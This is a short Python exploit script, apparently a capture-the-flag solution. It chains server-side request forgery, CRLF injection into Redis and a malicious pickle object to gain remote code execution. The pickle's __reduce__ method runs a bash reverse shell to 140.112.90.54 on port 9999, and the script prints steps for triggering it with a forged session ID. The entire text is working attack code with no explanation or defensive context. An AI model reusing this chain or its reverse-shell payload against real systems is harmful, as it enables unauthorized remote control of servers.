#!/usr/bin/env python
import urllib, requests, socket
import os
import pickle

class shell_class(object):
    def __reduce__(self):
        reverse_shell = "bash -c 'bash -i >& /dev/tcp/140.112.90.54/9999 0>&1'"
        return (os.system, (reverse_shell, ))

sh = shell_class()
sh_serial = pickle.dumps(sh)
print(sh_serial)
sh_serial = str(sh_serial)[1:]
sh_serial = urllib.parse.quote(sh_serial)
print(sh_serial)

# send payload
p = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:4dc7dde9-e8b6-4f60-93e5-475c29e7eb5a" ' + sh_serial + '%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
print('palyload for hackbar [  url=%s  ]' % (p))
r = requests.post('https://140.112.90.54:10163/', data={'url': p}, verify=False)
print('visit [  %s  ] in broewer with session ID NOT EQUAL [  %s  ] for reverse shell' % (r.text, "session:4dc7dde9-e8b6-4f60-93e5-475c29e7eb5a"))
